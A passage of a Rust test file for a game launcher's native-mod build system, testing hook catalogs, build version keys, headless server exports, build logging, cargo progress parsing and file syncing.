             [[injection]]\nid = \"hud\"\nkind = \"HEAD\"\nhook = \"hud\"\nhook_version = 1\n\
             [[injection]]\nid = \"raw\"\nkind = \"HEAD\"\ntarget = \"horizon_client::game::tick\"\n",
        )
        .unwrap();
    let c = "c".repeat(40);
    let blockscope = Bundle {
        horizon: Some(c.clone()),
        hooks: Some(2),
        ..bundle(&d, None).unwrap()
    };
    let shulker_peek = Bundle {
        id: "shulker_peek".into(),
        version: "0.1.0".into(),
        dir: PathBuf::new(),
        horizon: Some(A.into()),
        mixins: None,
        hooks: None,
        injections: Vec::new(),
        api: None,
        mixins_content: true,
    };
    // A (the pin) has hook points v2 and no catalog; B (the game) v359 and one.
    let at = |r: &str| match r.as_bytes()[0] {
        b'a' => Some(2),
        b'b' => Some(359),
        _ => None,
    };
    let catalog = |text: &str| catalog_in(text);
    let game_catalog = r#"{"hooks": [{"name": "hud", "version": 1, "target": "x"}]}"#;
    let listed = |r: &str| match r.as_bytes()[0] {
        b'b' => catalog(game_catalog),
        _ => None,
    };
    let mods = [shulker_peek.clone(), blockscope.clone()];
    let revision = with_hooks(&mods, A.into(), false, || Some(B.into()), at, listed).unwrap();
    assert_eq!(
        revision, B,
        "the pin has no catalog: the game's revision has one"
    );
    let asked = mismatch(&mods, &revision).expect("the pinned mod waits for Build anyway");
    assert!(asked.contains("shulker_peek"), "{asked}");
    // A game without the catalog either refuses, naming the mod that needs it.
    let err = with_hooks(&mods, A.into(), false, || Some(c.clone()), at, listed).unwrap_err();
    assert!(err.contains("blockscope (hook points v2)"), "{err}");
    // A catalog with only another version of the hook point doesn't do either.
    let other = |_: &str| catalog(r#"{"hooks": [{"name": "hud", "version": 2, "target": "x"}]}"#);
    assert!(with_hooks(&mods, A.into(), false, || Some(B.into()), at, other).is_err());
    // A mod with only raw targets still builds on the pin, without asking for a catalog.
    let raw = Bundle {
        injections: blockscope.injections[1..].to_vec(),
        ..blockscope
    };
    let asks = |_: &str| -> Option<HookCatalog> { panic!("no named hook point to look up") };
    assert_eq!(
        with_hooks(&[shulker_peek, raw], A.into(), false, || None, at, asks).unwrap(),
        A
    );
    assert_eq!(catalog_in("not json"), None);
}

#[test]
fn a_hooks_bundle_is_read_and_repinned_to_the_build() {
    let d = dir("hooks");
    write_native(&d, "zoom", A, B);
    let json = fs::read_to_string(d.join(NATIVE_MANIFEST)).unwrap();
    let json = json.replacen('}', ",\"hooks\":1}", 1);
    fs::write(d.join(NATIVE_MANIFEST), json).unwrap();
    let found = bundles(&d).unwrap();
    assert_eq!(
        (found[0].hooks, found[0].horizon.as_deref()),
        (Some(1), Some(A))
    );
    repin(&found[0], B).unwrap();
    let again = bundle(&found[0].dir, None).unwrap();
    assert_eq!(
        (again.id.as_str(), again.horizon.as_deref()),
        ("zoom", Some(B))
    );
}

#[test]
fn the_version_changes_with_the_revision_and_any_file_of_the_mods() {
    let d = dir("key");
    write_bundle(&d, "hello", "fn hook() {}");
    let key = |revision: &str| {
        version_for(
            revision,
            MIXINS_REV,
            Profile::Performance,
            Target::Client,
            None,
            &bundles(&d).unwrap(),
        )
        .unwrap()
    };
    let first = key(A);
    assert!(first.starts_with("native-aaaaaaa-") && first.len() == "native-aaaaaaa-".len() + 12);
    assert!(is_native(&first) && !backend::is_game_tag(&first));
    assert_eq!(first, key(A));
    assert_ne!(
        first,
        version_for(
            A,
            MIXINS_REV,
            Profile::Performance,
            Target::Client,
            Some(rust_toolchain::WINDOWS_ARM64_TARGET),
            &bundles(&d).unwrap(),
        )
        .unwrap(),
        "the ARM64 toolchain has a separate installed build"
    );
    assert_ne!(first, key(B));
    assert_ne!(
        first,
        version_for(
            A,
            B,
            Profile::Performance,
            Target::Client,
            None,
            &bundles(&d).unwrap()
        )
        .unwrap()
    );
    fs::write(d.join("hook.rs"), "fn hook() { let _ = 1; }").unwrap();
    assert_ne!(first, key(A));
}

#[test]
fn api_target_is_neither_copied_nor_hashed() {
    let d = dir("api-target");
    fs::create_dir_all(d.join("engine/target/debug")).unwrap();
    fs::create_dir_all(d.join("other/target")).unwrap();
    fs::create_dir_all(d.join("engine/empty")).unwrap();
    fs::write(
        d.join(MANIFEST),
        "[mod]\nid = 'example'\nversion = '1'\n[api]\npath = 'engine'\n",
    )
    .unwrap();
    fs::write(
        d.join("engine/Cargo.toml"),
        "[package]\nname = 'example'\nversion = '0.1.0'\n",
    )
    .unwrap();
    fs::write(d.join("engine/target/debug/output"), "one").unwrap();
    fs::write(d.join("other/target/keep"), "keep").unwrap();
    let bundle = bundle(&d, None).unwrap();
    let key = || {
        version_for(
            A,
            B,
            Profile::Performance,
            Target::Client,
            None,
            std::slice::from_ref(&bundle),
        )
        .unwrap()
    };
    let first = key();
    let hash = mod_hash(&bundle).unwrap();
    let digest = source_digest(&bundle);
    fs::write(d.join("engine/target/debug/output"), "two").unwrap();
    assert_eq!(first, key());
    assert_eq!(hash, mod_hash(&bundle).unwrap());
    assert_eq!(digest, source_digest(&bundle));
    let dest = dir("api-target-copy");
    copy_bundle(&bundle, &dest).unwrap();
    assert!(!dest.join("engine/target").exists());
    assert!(dest.join("engine/empty").is_dir());
    assert!(dest.join("other/target/keep").is_file());
    fs::write(d.join("engine/Cargo.toml"), "changed").unwrap();
    assert_ne!(first, key());
}

/// The test bundle (`tests/fixtures/native-crate-demo`): its crate's sources and data, and its
/// own data folder, are all in the build's key.
#[test]
fn the_key_covers_a_bundles_crate_and_data_files() {
    let fixture = Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/native-crate-demo");
    let d = dir("crate-key");
    backend::copy_dir(&fixture, &d).unwrap();
    let found = bundles(&d).unwrap();
    assert_eq!(found[0].id, "crate_demo");
    let key = || {
        version_for(
            A,
            B,
            Profile::Performance,
            Target::Client,
            None,
            &bundles(&d).unwrap(),
        )
        .unwrap()
    };
    let mut seen = vec![key()];
    for file in [
        "engine/src/lib.rs",
        "engine/data/salt.txt",
        "engine/Cargo.toml",
        "data/greeting.txt",
    ] {
        let mut bytes = fs::read(d.join(file)).unwrap();
        bytes.extend_from_slice(b"\n");
        fs::write(d.join(file), bytes).unwrap();
        let now = key();
        assert!(!seen.contains(&now), "{file} is in the key");
        seen.push(now);
    }
}

#[test]
fn each_profile_has_its_own_key_and_performance_shares_its_folder_with_dev() {
    let d = dir("profile-key");
    write_bundle(&d, "hello", "fn hook() {}");
    let found = bundles(&d).unwrap();
    let keys: std::collections::BTreeSet<_> = (Profile::ALL.into_iter())
        .map(|p| version_for(A, B, p, Target::Client, None, &found).unwrap())
        .collect();
    assert_eq!(keys.len(), 3);
    // The last build in `native/target/fast/` is either's, as `fast`'s was before `dev`.
    assert_eq!(
        record_key(Target::Client, Profile::Performance, None),
        "fast"
    );
    assert_eq!(record_key(Target::Client, Profile::Dev, None), "fast");
    assert_eq!(
        record_key(Target::Server, Profile::Release, None),
        "server-release"
    );
    assert_eq!(
        record_key(
            Target::Client,
            Profile::Performance,
            Some(rust_toolchain::WINDOWS_ARM64_TARGET)
        ),
        "aarch64-pc-windows-gnullvm-fast"
    );
}

#[test]
fn staged_cargo_uses_only_its_own_injections_including_cached_output() {
    let d = dir("injection-env");
    let fresh = d.join("fresh");
    let snapshot = d.join("snapshot");
    let stage = d.join("stage");
    fs::create_dir_all(fresh.join("crates/horizon-client")).unwrap();
    fs::write(
            fresh.join("crates/horizon-client/Cargo.toml"),
            "[package]\nname = 'horizon-client'\nversion = '0.1.0'\n[build-dependencies]\nhorizon-mod-api-gen = { path = '../horizon-mod-api-gen' }\n",
        )
        .unwrap();
    let rusts = toolchains(d.join("rust"));
    // The same for every host.
    let env = |dir: &Path| {
        let each: Vec<_> = rusts
            .iter()
            .map(|rust| {
                cargo(rust, dir, "build")
                    .get_envs()
                    .find(|(key, _)| *key == inject::ENV)
                    .map(|(_, value)| value.map(std::ffi::OsStr::to_owned))
            })
            .collect();
        assert!(each.windows(2).all(|w| w[0] == w[1]), "{each:?}");
        each[0].clone()
    };
    assert_eq!(env(&stage), Some(None));
    inject::stage(&fresh, &[]).unwrap();
    sync(&fresh, &snapshot).unwrap();
    sync(&snapshot, &stage).unwrap();
    assert_eq!(fs::read(stage.join(inject::INPUT)).unwrap(), b"[]");
    assert_eq!(
        env(&stage),
        Some(Some(stage.join(inject::INPUT).into_os_string()))
    );
    fs::remove_file(fresh.join(inject::INPUT)).unwrap();
    sync(&fresh, &stage).unwrap();
    assert_eq!(env(&stage), Some(None));
    fs::remove_dir_all(d).unwrap();
}

/// The server build (docs/server.md): compiled headless off the same source, with its own
/// key, and the game build's flags unchanged.
#[test]
fn a_server_build_compiles_headless_with_its_own_key() {
    let d = dir("server-key");
    write_bundle(&d, "hello", "fn hook() {}");
    let found = bundles(&d).unwrap();
    let key =
        |target: Target| version_for(A, B, Profile::Performance, target, None, &found).unwrap();
    assert_ne!(
        key(Target::Client),
        key(Target::Server),
        "the two targets never stand in for each other"
    );
    assert_eq!(key(Target::Server), key(Target::Server));
    assert_ne!(
        key(Target::Server),
        version_for(A, B, Profile::Release, Target::Server, None, &found).unwrap(),
        "the profile is still in the server key"
    );
    let rusts = toolchains("/rust/1.99.1-x");
    // The same after each host's own arguments.
    let flags = |stage: &Path, target: Target| {
        let each: Vec<Vec<String>> = rusts
            .iter()
            .map(|rust| {
                let cmd = compile(
                    rust,
                    stage,
                    target,
                    Path::new("/native/target"),
                    Profile::Performance,
                    "horizon-client",
                );
                args_after_host(rust, &cmd)
            })
            .collect();
        assert!(each.windows(2).all(|w| w[0] == w[1]), "{each:?}");
        each[0].clone()
    };
    let server = flags(&d, Target::Server);
    assert!(server.contains(&"--no-default-features".into()));
    assert!(
        !server.iter().any(|a| a.starts_with("--features")),
        "no feature the source doesn't have"
    );
    let client = flags(&d, Target::Client);
    assert!(!client.contains(&"--no-default-features".into()));
    // A source with the `mods` feature keeps it in both builds.
    fs::create_dir_all(d.join("crates/horizon-client")).unwrap();
    fs::write(
        d.join("crates/horizon-client/Cargo.toml"),
        "[features]\nmods = []\n",
    )
    .unwrap();
    for target in [Target::Client, Target::Server] {
        let args = flags(&d, target);
        assert!(
            args.windows(2)
                .any(|w| w == ["--features", FEATURES].map(String::from)),
            "{:?}: the mods feature stays on",
            target
        );
    }
}

/// A record (`native-mods.json`) says what it compiles; one from before targets were
/// recorded is a client build, so it still reads ([`about`]).
#[test]
fn a_builds_record_names_its_target_and_older_ones_still_read() {
    let d = dir("about-target");
    let record = |target: Option<&str>| {
        let json = match target {
            Some(target) => {
                format!(r#"{{"base":"v2026.10.13","horizon":"{A}","target":"{target}"}}"#)
            }
            None => format!(r#"{{"base":"v2026.10.13","horizon":"{A}"}}"#),
        };
        fs::write(d.join("native-mods.json"), json).unwrap();
        about_in(&d).unwrap()
    };
    assert_eq!(
        record(None).target,
        Target::Client,
        "a build from before targets"
    );
    assert_eq!(record(Some("client")).target, Target::Client);
    assert_eq!(record(Some("server")).target, Target::Server);
    assert_eq!(record(Some("anything-else")).target, Target::Client);
    assert_eq!(record(None).horizon, A);
    let old = record(None);
    assert_eq!(
        (old.base_horizon, old.pinned_by, old.on_base),
        (None, Vec::new(), false),
        "a build from before pins were recorded"
    );
    fs::write(
            d.join("native-mods.json"),
            format!(
                r#"{{"base":"nightly-2026-11-04-bbbbbbb","horizon":"{A}","base_horizon":"{B}","pinned_by":["right_click_crops"],"on_base":false}}"#
            ),
        )
        .unwrap();
    let pinned = about_in(&d).unwrap();
    assert_eq!(pinned.base_horizon.as_deref(), Some(B));
    assert_eq!(pinned.pinned_by, ["right_click_crops"]);
}

/// The export ([`build_server`]): a standalone runtime folder with the engine, the mods'
/// data and the build's record, engine still executable, and nothing of the player's
/// overwritten.
#[test]
fn an_exported_server_folder_keeps_its_files_and_overwrites_nothing() {
    let built = dir("export-built");
    fs::write(built.join(Target::Server.binary()), b"engine").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(
            built.join(Target::Server.binary()),
            std::fs::Permissions::from_mode(0o755),
        )
        .unwrap();
    }
    fs::create_dir_all(built.join("native-data/bake")).unwrap();
    fs::write(built.join("native-data/bake/table.bin"), b"data").unwrap();
    fs::create_dir_all(built.join("resources")).unwrap();
    fs::write(built.join("resources/lang.json"), b"{}").unwrap();
    let out = dir("export-out");
    let output = out.join("server");
    export(&built, &output).unwrap();
    assert_eq!(
        fs::read(output.join(Target::Server.binary())).unwrap(),
        b"engine"
    );
    assert_eq!(
        fs::read(output.join("native-data/bake/table.bin")).unwrap(),
        b"data"
    );
    assert_eq!(fs::read(output.join("resources/lang.json")).unwrap(), b"{}");
    assert_eq!(
        fs::read_dir(&out).unwrap().flatten().count(),
        1,
        "no staging folder left beside it"
    );
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(output.join(Target::Server.binary()))
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o111, 0o111, "the engine stays executable");
    }
    // A folder already there is refused, and its contents are left alone.
    let taken = dir("export-taken");
    fs::write(taken.join("keep.txt"), b"mine").unwrap();
    let err = export(&built, &taken).unwrap_err();
    assert!(err.contains("already exists"), "{err}");
    assert_eq!(fs::read(taken.join("keep.txt")).unwrap(), b"mine");
    let failed = out.join("failed");
    assert!(export(&out.join("missing-source"), &failed).is_err());
    assert!(!failed.exists());
    assert_eq!(fs::read_dir(&out).unwrap().flatten().count(), 1);
}

#[test]
fn server_install_is_not_playable_and_export_survives_cache_removal() {
    let base = "native-test-server-base";
    let version = "native-test-server-cache";
    let source = backend::version_dir(base);
    fs::create_dir_all(source.join(".local/horizon-client/26.3")).unwrap();
    fs::write(
        source.join(".local/horizon-client/26.3/facts.json"),
        b"facts",
    )
    .unwrap();
    fs::write(source.join(Target::Server.binary()), b"unmodded").unwrap();
    let binary = dir("server-install").join("built");
    fs::write(&binary, b"modded").unwrap();
    install(
        base,
        version,
        Target::Server,
        &binary,
        &serde_json::json!({"target":"server"}),
        |d| {
            fs::create_dir_all(d.join("native-data")).unwrap();
            fs::write(d.join("native-data/test"), b"baked").unwrap();
            Ok(())
        },
    )
    .unwrap();
    assert!(!backend::installed().contains(&version.to_string()));
    let cached = Target::Server.directory(version);
    let output = dir("server-independent").join("export");
    export(&cached, &output).unwrap();
    fs::remove_dir_all(cached).unwrap();
    assert_eq!(
        fs::read(output.join(Target::Server.binary())).unwrap(),
        b"modded"
    );
    assert_eq!(fs::read(output.join("native-data/test")).unwrap(), b"baked");
    assert_eq!(
        fs::read(output.join(".local/horizon-client/26.3/facts.json")).unwrap(),
        b"facts"
    );
    assert!(output.join("native-mods.json").is_file());
    let _ = fs::remove_dir_all(source);
}

/// The export's own gate: an output that already exists is refused before anything is
/// downloaded or compiled (a base that isn't installed would refuse the build otherwise),
/// and no instance is edited or version selected.
#[test]
fn a_server_build_refuses_an_existing_output_before_building() {
    let _guard = LOG_TEST.lock().unwrap();
    let output = dir("server-output");
    let folder = dir("server-mods");
    write_bundle(&folder, "hello", "fn hook() {}");
    let instances_before = instances::list();
    let selected_before = backend::Settings::load().selected;
    let err = build_server(
        "v0.0.0-not-installed",
        &folder,
        &output,
        true,
        false,
        Profile::Performance,
        |_| {},
    )
    .unwrap_err();
    assert!(err.contains("already exists"), "{err}");
    assert!(fs::read_to_string(log_path()).unwrap().contains(&err));
    let managed = root().join("forbidden-export");
    let err = build_server(
        "v0.0.0-not-installed",
        &folder,
        &managed,
        true,
        false,
        Profile::Performance,
        |_| {},
    )
    .unwrap_err();
    assert!(
        err.contains("outside the launcher's managed folders"),
        "{err}"
    );
    assert!(!managed.exists());
    assert_eq!(instances::list(), instances_before, "no instance is edited");
    assert_eq!(
        backend::Settings::load().selected,
        selected_before,
        "no version is selected"
    );
}

#[test]
fn the_setting_picks_the_profile_and_the_old_switch_still_picks_release() {
    let mut settings = crate::backend::Settings::default();
    assert_eq!(Profile::chosen(&settings), Profile::Performance);
    settings.native_release = true;
    assert_eq!(Profile::chosen(&settings), Profile::Release);
    settings.native_profile = Some(Profile::Dev);
    assert_eq!(Profile::chosen(&settings), Profile::Dev);
    assert_eq!(Profile::parse("performance"), Some(Profile::Performance));
    assert_eq!(Profile::parse("fast"), Some(Profile::Performance));
    assert_eq!(Profile::parse(" release "), Some(Profile::Release));
    assert_eq!(Profile::parse("debug"), None);
    let text = serde_json::to_string(&settings).unwrap();
    assert!(text.contains("\"native_profile\":\"dev\""), "{text}");
}

/// The build log ([`clear_log`], [`append_log`]): fresh for every attempt, and an early
/// failure (before any command ran) recorded in it, in one test because they share the
/// one log file.
#[test]
fn the_log_is_fresh_per_attempt_and_keeps_early_failures() {
    let _guard = LOG_TEST.lock().unwrap();
    clear_log().unwrap();
    append_log("the last build's output").unwrap();
    clear_log().unwrap();
    assert_eq!(fs::read(log_path()).unwrap(), b"");
    append_log("a line").unwrap();
    append_log("another").unwrap();
    assert_eq!(fs::read_to_string(log_path()).unwrap(), "a line\nanother\n");
    // A build that fails before anything runs empties the old log and says why.
    let folder = dir("log-early");
    write_bundle(&folder, "hello", "fn hook() {}");
    let out = dir("log-early-out");
    let err = build_server(
        "v0.0.0-not-installed",
        &folder,
        &out.join("server"),
        true,
        false,
        Profile::Performance,
        |_| {},
    )
    .unwrap_err();
    assert!(err.contains("is not prepared yet"), "{err}");
    let log = fs::read_to_string(log_path()).unwrap();
    assert!(log.contains("is not prepared yet"), "{log}");
    assert!(!log.contains("the last build's output"), "{log}");
    // A failure after compiler output keeps those diagnostics and the final reason.
    let failure: Result<(), String> = logged(|| {
        append_log("error[E0425]: cannot find value `missing` in this scope")?;
        Err("Could not export the engine".into())
    });
    assert!(failure.is_err());
    let log = fs::read_to_string(log_path()).unwrap();
    assert!(log.starts_with("error[E0425]"), "{log}");
    assert!(
        log.ends_with("The build failed: Could not export the engine\n"),
        "{log}"
    );
    assert!(!log.contains("Build completed."), "{log}");
    let success: Result<(), String> = logged(|| Ok(()));
    success.unwrap();
    assert_eq!(
        fs::read_to_string(log_path()).unwrap(),
        "Build completed.\n"
    );
}

fn record(horizon: &str, mods: &[(&str, &str)]) -> Record {
    Record {
        horizon: horizon.into(),
        mixins: "m1".into(),
        mods: mods
            .iter()
            .map(|(a, b)| (a.to_string(), b.to_string()))
            .collect(),
    }
}

#[test]
fn a_build_is_up_to_date_incremental_or_the_first() {
    let now = record("aaaaaaa1111", &[("zoom", "1"), ("keys", "1")]);
    assert_eq!(classify(true, None, &now), Plan::UpToDate);
    assert_eq!(classify(false, None, &now), Plan::First);
    assert_eq!(
        First_label(),
        "First build: the whole game (several minutes)"
    );
    let before = record("aaaaaaa1111", &[("zoom", "1"), ("keys", "0")]);
    assert_eq!(
        classify(false, Some(&before), &now),
        Plan::Incremental(vec!["mods keys".into()])
    );
    let mut next = record("bbbbbbb2222", &[("zoom", "2"), ("keys", "1")]);
    let plan = classify(false, Some(&before), &next);
    assert_eq!(
        plan.label(),
        "Incremental rebuild: Horizon commit aaaaaaa to bbbbbbb; mods keys, zoom"
    );
    // A removed mod counts as a change too.
    next = record("aaaaaaa1111", &[("zoom", "1")]);
    let plan = classify(false, Some(&now), &next);
    assert_eq!(plan, Plan::Incremental(vec!["mods keys".into()]));
    assert_eq!(
        classify(false, Some(&now), &now),
        Plan::Incremental(vec!["the build settings".into()])
    );
}

#[allow(non_snake_case)]
fn First_label() -> String {
    Plan::First.label()
}

#[test]
fn the_steps_name_the_profile_and_the_outcome() {
    assert_eq!(
        Step::Plan(Plan::UpToDate, Profile::Performance).label(),
        "Up to date (no build needed) (performance)"
    );
    let compile = Step::Compile {
        done: 12,
        total: Some(430),
        name: "serde".into(),
        profile: Profile::Performance,
    };
    assert_eq!(
        compile.label(),
        "Compiling the game (performance): 12 of 430 crates, now serde"
    );
    let done = |secs, profile, plan| Step::Done {
        secs,
        profile,
        plan,
    };
    assert_eq!(
        done(42, Profile::Performance, Plan::Incremental(vec![])).label(),
        "Built in 42 s (performance, incremental)"
    );
    assert_eq!(
        done(125, Profile::Release, Plan::First).label(),
        "Built in 2 min 5 s (release, first build)"
    );
}

#[test]
fn cargos_output_gives_the_crate_and_the_progress() {
    assert_eq!(
        parse_cargo("   Compiling serde v1.0.228"),
        vec![Cargo::Compiling("serde".into())]
    );
    assert_eq!(
        parse_cargo("   Building [==>        ] 12/430: serde, syn"),
        vec![Cargo::Progress(12, 430)]
    );
    // The bar is redrawn with carriage returns and escapes, then the next line follows.
    assert_eq!(
            parse_cargo(
                "   Building [=>   ] 3/9: a\r\x1b[K   Building [==>  ] 4/9: b\r      \r   Compiling b v0.1.0"
            ),
            vec![
                Cargo::Progress(3, 9),
                Cargo::Progress(4, 9),
                Cargo::Compiling("b".into())
            ]
        );
    assert!(parse_cargo("warning: unused variable").is_empty());
    assert!(parse_cargo("    Finished `fast` profile in 1m").is_empty());
    // The log leaves out the progress bar, never what follows it on the same line.
    assert_eq!(log_text("   Building [=>   ] 3/9: a"), None);
    assert_eq!(log_text("\x1b[K"), None);
    assert_eq!(
        log_text("   Building [=>   ] 3/9: a\r   Compiling b v1").as_deref(),
        Some("   Compiling b v1")
    );
    assert_eq!(
        log_text("   Building [=>   ] 3/9: a\r\x1b[Kerror[E0425]: cannot find `x`").as_deref(),
        Some("error[E0425]: cannot find `x`")
    );
    assert_eq!(
        log_text("\x1b[K\x1b[33mwarning\x1b[0m: unused").as_deref(),
        Some("warning: unused")
    );
    assert_eq!(log_text("warning: x").as_deref(), Some("warning: x"));
}

#[test]
fn only_changed_files_are_written_again() {
    let (from, to) = (dir("sync-from"), dir("sync-to"));
    fs::create_dir_all(from.join("src")).unwrap();
    fs::write(from.join("src/a.rs"), "a").unwrap();
    fs::write(from.join("src/b.rs"), "b2").unwrap();
    fs::create_dir_all(to.join("src")).unwrap();
    fs::write(to.join("src/a.rs"), "a").unwrap();
    fs::write(to.join("src/b.rs"), "b").unwrap();
    fs::write(to.join("gone.rs"), "x").unwrap();
    let before = fs::metadata(to.join("src/a.rs"))
        .unwrap()
        .modified()
        .unwrap();
    std::thread::sleep(std::time::Duration::from_millis(20));
    sync(&from, &to).unwrap();
    assert_eq!(
        fs::metadata(to.join("src/a.rs"))
            .unwrap()
            .modified()
            .unwrap(),
        before
    );
    assert_eq!(fs::read_to_string(to.join("src/b.rs")).unwrap(), "b2");
    assert!(!to.join("gone.rs").exists());
}

/// #10421: a Nightly's source carries its commit's time, older than a build made since on
/// another Nightly. Its changed files must reach the stage newer than that build, or Cargo
/// keeps the old crate.
#[test]
fn a_changed_file_is_newer_than_the_last_build_even_from_an_older_source() {
    use std::time::{Duration, SystemTime};
    let (from, to) = (dir("sync-old-from"), dir("sync-old-to"));
    let commit = SystemTime::UNIX_EPOCH + Duration::from_secs(1_000_000_000);
    fs::create_dir_all(from.join("crates/horizon-core/src")).unwrap();
    let file = from.join("crates/horizon-core/src/storage.rs");
    fs::write(&file, "pub fn unpack_into() {}").unwrap();
    fs::File::options()
        .write(true)
        .open(&file)
        .unwrap()
        .set_modified(commit)
        .unwrap();
    fs::create_dir_all(to.join("crates/horizon-core/src")).unwrap();
    fs::write(
        to.join("crates/horizon-core/src/storage.rs"),
        "pub fn unpack() {}",
    )
    .unwrap();
    // The older Nightly's build: Cargo records when it started.
    let built = SystemTime::now();
    std::thread::sleep(Duration::from_millis(20));
    sync(&from, &to).unwrap();
    let staged = to.join("crates/horizon-core/src/storage.rs");
    assert_eq!(
        fs::read_to_string(&staged).unwrap(),
        "pub fn unpack_into() {}"
    );
    assert!(fs::metadata(&staged).unwrap().modified().unwrap() > built);
    // A file new to the stage too.
    fs::remove_dir_all(&to).unwrap();
    sync(&from, &to).unwrap();
    assert!(fs::metadata(&staged).unwrap().modified().unwrap() > built);
    fs::remove_dir_all(from).unwrap();
    fs::remove_dir_all(to).unwrap();
}

/// A stage from before #10421 may hold old times over newer content: it is made again once,
/// and kept on every later build.
#[test]
fn a_stage_from_before_the_time_fix_is_written_again_once() {
    let root = dir("stage-stamped");
    fs::create_dir_all(root.join("stage/src")).unwrap();
    fs::write(root.join("stage/src/lib.rs"), "old").unwrap();
    let stage = stage_dir(&root).unwrap();
    assert_eq!(stage, root.join("stage"));
    assert!(!stage.exists());
    fs::create_dir_all(stage.join("src")).unwrap();
    fs::write(stage.join("src/lib.rs"), "new").unwrap();
    stage_dir(&root).unwrap();
    assert_eq!(fs::read_to_string(stage.join("src/lib.rs")).unwrap(), "new");
    fs::remove_dir_all(root).unwrap();
}

/// levzzz5154's decision (2026-10-29): a rebuild stays on the Horizon the instance plays;
/// only "Rebuild on Horizon {version}" moves it to a newer one.
#[test]
fn a_rebuild_stays_on_the_instances_horizon_until_an_update() {
    let installed: Vec<String> = [
        "nightly-2026-10-29-4baa571",
        "v2026.10.20",
        "native-83f15fa-0123456789ab",
        "v2026.10.13",
    ]
    .map(String::from)
    .to_vec();
    let base = |current: Option<&str>, update| base_for(current, &installed, update);
    let native = "native-83f15fa-0123456789ab";
    assert_eq!(base(Some(native), false).as_deref(), Some(native));
    assert_eq!(
        base(Some("v2026.10.13"), false).as_deref(),
        Some("v2026.10.13")
    );
    let newest = Some("nightly-2026-10-29-4baa571");
    assert_eq!(base(Some(native), true).as_deref(), newest);
    assert_eq!(base(None, false).as_deref(), newest);
    assert_eq!(base(Some("native-gone"), false).as_deref(), newest);
    assert_eq!(base_for(Some(native), &[native.into()], true), None);
    // Update offers the newest release or Nightly, when newer than the build's own.
    assert_eq!(newer_than("v2026.10.20", &installed).as_deref(), newest);
    assert_eq!(newer_than("nightly-2026-10-29-4baa571", &installed), None);
    let releases = ["v2026.10.20".to_string(), "v2026.10.13".to_string()];
    assert_eq!(newer_than("v2026.10.20", &releases), None);
    assert_eq!(
        newer_than("v2026.10.13", &releases).as_deref(),
        Some("v2026.10.20")
    );
}

#[test]
fn the_newest_builds_no_instance_plays_are_kept() {
    let at = |s: u64| std::time::UNIX_EPOCH + std::time::Duration::from_secs(s);
    let builds: Vec<(String, std::time::SystemTime)> = [
        ("native-a", 1),
        ("native-b", 6),
        ("native-c", 3),
        ("native-d", 5),
        ("native-e", 4),
        ("native-f", 2),
        ("native-g", 7),
    ]
    .map(|(v, s)| (v.to_string(), at(s)))
    .to_vec();
    // g was just built, b another instance plays: d, e and c are the newest spare ones.
    let mut gone = stale(builds.clone(), "native-g", &["native-b".into()]);
    gone.sort();
    assert_eq!(gone, ["native-a", "native-f"]);
    assert!(stale(builds[..4].to_vec(), "native-a", &[]).is_empty());
}

#[test]
fn the_game_compiles_outside_the_players_cargo_configuration() {
    for rust in toolchains("/rust/1.99.1-x") {
        assert_eq!(
            host_args(&rust).is_empty(),
            rust.host.target != rust_toolchain::WINDOWS_ARM64_TARGET,
            "only the ARM64 host adds its target's rustflags"
        );
        compiles_outside_the_players_cargo_configuration(&rust);
    }
}

fn compiles_outside_the_players_cargo_configuration(rust: &Toolchain) {
    let stage = dir(&format!("stage-config-{}", rust.host.target));
    let cmd = compile(
        rust,
        &stage,
        Target::Client,
        Path::new("/native/target"),
        Profile::Performance,
        "horizon-client",
    );
    let args = args_after_host(rust, &cmd);
    assert_eq!(
        args[..3],
        [
            "build",
            "--manifest-path",
            &*stage.join("Cargo.toml").to_string_lossy()
        ]
    );
    assert!(args.ends_with(&["-p", "horizon-client", "--bin", "horizon-client"].map(String::from)));
    let dir = cmd.get_current_dir().expect("a folder of its own");
    assert!(
        dir.has_root() && dir.parent().is_none(),
        "{}",
        dir.display()
    );
    // The workspace's own configuration still applies.
    fs::create_dir_all(stage.join(".cargo")).unwrap();
    fs::write(stage.join(".cargo/config.toml"), "").unwrap();
    let cmd = compile(
        rust,
        &stage,
        Target::Client,
        Path::new("/native/target"),
        Profile::Performance,
        "horizon-client",
    );
    let args = args_after_host(rust, &cmd);
    assert_eq!(args[1], "--config");
    assert_eq!(PathBuf::from(&args[2]), stage.join(".cargo/config.toml"));
    let _ = fs::remove_dir_all(stage);
}

#[test]
fn the_game_build_is_the_official_game_where_the_revision_has_it() {
    let stage = dir("official-game");
    // A revision from before horizon-official: horizon-client's game, as its release shipped.
    assert_eq!(
        api::game_package(&stage, Target::Client, false),
        "horizon-client"
    );
    fs::create_dir_all(stage.join("crates/horizon-official")).unwrap();
    fs::write(stage.join("crates/horizon-official/Cargo.toml"), "").unwrap();
    assert_eq!(
        api::game_package(&stage, Target::Client, false),
        api::OFFICIAL
    );
    // The server build has no Horizon parts; trait mods build their generated executable.
    assert_eq!(
        api::game_package(&stage, Target::Server, false),
        "horizon-client"
    );
    assert_eq!(
        api::game_package(&stage, Target::Client, true),
        api::PACKAGE
    );
    for rust in toolchains("/rust/1.99.1-x") {
        let cmd = compile(
            &rust,
            &stage,
            Target::Client,
            Path::new("/native/target"),
            Profile::Performance,
            api::OFFICIAL,
        );
        let args = args_after_host(&rust, &cmd);
        assert!(args.ends_with(&["-p", api::OFFICIAL, "--bin", api::OFFICIAL].map(String::from)));
    }
    let _ = fs::remove_dir_all(stage);
}

#[test]
fn builds_fall_back_to_release_where_the_source_has_no_fast_profile() {
    let d = dir("profile");
    assert_eq!(profile_of(&d, Profile::Performance), Profile::Release);
    fs::write(d.join("Cargo.toml"), "[profile.release]\nlto = \"thin\"\n").unwrap();
    assert_eq!(profile_of(&d, Profile::Performance), Profile::Release);
    fs::write(
        d.join("Cargo.toml"),
        "[profile.release]\nlto = \"thin\"\n[profile.fast]\ninherits = \"release\"\n",
    )
    .unwrap();
    assert_eq!(profile_of(&d, Profile::Performance), Profile::Performance);
    assert_eq!(
        profile_of(&d, Profile::Release),
        Profile::Release,
        "the player's choice of release stays"
    );
    let rusts = toolchains("/rust/1.99.1-x");
    // The same after each host's own arguments.
    let args = |profile| -> Vec<String> {
        let each: Vec<Vec<String>> = rusts
            .iter()
